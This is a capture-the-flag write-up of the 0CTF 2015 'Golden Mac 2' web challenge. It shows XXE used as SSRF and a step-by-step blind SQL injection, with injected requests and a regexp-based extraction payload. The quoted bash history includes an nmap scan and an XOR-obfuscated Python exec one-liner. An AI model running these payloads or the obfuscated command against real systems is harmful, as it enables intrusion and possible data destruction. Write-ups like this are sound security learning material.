+++
author = "pwntester"
date = 2015-03-30T18:51:06Z
description = ""
draft = false
slug = "0ctf-2015-golden-mac-2-web-300"
title = "0CTF 2015 - Golden Mac 2 (web 300)"

+++

While playing [Golden Mac 1](http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/) I found the `./bash_history` for user `salt` that looked like:

```lang-raw
whoami
pwd
ls
sudo nmap -sS 202.112.26.1/24 -p 22,80,3306
curl http://202.112.26.103/secret_blog/?id=1
msfconsole
curl https://twitter.com/_SaxX_/status/580376290525650944
python -c "exec ''.join([chr(ord(i)^0x46) for i in '/+6)42f)5}f)5h5?52#+nd4+fk4 f8ido'])"<br />
shit!
exit
```
While the SaxX tweet was funny, the `secret_blog` looked promising. The IP was not accessible from the outside but we could leverage our XXE injection into a SSRF vulnerability and visit the blog. Using the XXE injection in the docx document, you can visit `http://202.112.26.103/secret_blog/?id=1` and get `You do not have permission to access this post!`
Other interesting results were:

```lang-raw
http://202.112.26.103/secret_blog/?id=1
You do not have permission to access this post!

http://202.112.26.103/secret_blog/?id=0
Please specify an id :)

http://202.112.26.103/secret_blog/?id=2
You do not have permission to access this post!

http://202.112.26.103/secret_blog/?id=3
Post not exists!
```

Also:
```lang-raw
http://202.112.26.103/secret_blog/?id=1 order by 1
You do not have permission to access this post!
```
Cool! so it seems it is vulnerable to blind SQL injection.

Further steps:
```lang-raw
http://202.112.26.103/secret_blog/?id=1 or id=(select 1)
You do not have permission to access this post!

http://202.112.26.103/secret_blog/?id=1 or id=(select notexisting from nowhere)
500 Internal error

http://202.112.26.103/secret_blog/?id=1 or id=(select flag from flag)
You do not have permission to access this post!
YAY!!
```
At this point it was a matter of running a blind sql injection attack to extract the flag.

True statements:
```lang-raw
http://202.112.26.103/secret_blog/?id=1 and true
You do not have permission to access this post!
```

False statements:
```lang-raw
http://202.112.26.103/secret_blog/?id=1 and false
Post not exists!
```

We get the flag using binary search with regular expressions like:

```lang-raw
http://202.112.26.103/secret_blog/?id=1 and ((select flag from flag) regexp binary '^%s' = 1)
```

FLAG: `0ctf{you_good_pentester_finally_find_me}`



